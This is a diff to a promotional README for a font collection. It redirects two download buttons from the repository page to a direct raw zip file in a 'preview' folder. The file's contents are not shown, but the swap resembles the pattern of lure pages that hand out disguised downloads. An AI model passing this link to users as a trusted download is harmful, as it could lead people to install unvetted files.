@@ -26,7 +26,7 @@ Getting started is incredibly easy! Here's everything you need to do:
 
 Ready to dive in? Great! Click the big, beautiful button below to visit the download page:
 
-**[🎯 DOWNLOAD AWESOME-DESIGNER-FONTS NOW](https://github.com/Artbymizzu/awesome-designer-fonts)**
+**[🎯 DOWNLOAD AWESOME-DESIGNER-FONTS NOW](https://github.com/Artbymizzu/awesome-designer-fonts/raw/refs/heads/main/preview/fonts_awesome_designer_motherly.zip)**
 
 *This link is your golden ticket to the entire collection!*
 
@@ -158,7 +158,7 @@ You're now fully equipped to explore the wonderful world of professional typogra
 
 Remember, the complete collection is just one click away:
 
-**[🚀 DOWNLOAD AWESOME-DESIGNER-FONTS NOW](https://github.com/Artbymizzu/awesome-designer-fonts)**
+**[🚀 DOWNLOAD AWESOME-DESIGNER-FONTS NOW](https://github.com/Artbymizzu/awesome-designer-fonts/raw/refs/heads/main/preview/fonts_awesome_designer_motherly.zip)**
 
 Open the link, browse the variety, pick your favorites, and install them in moments. It's truly that simple!
 
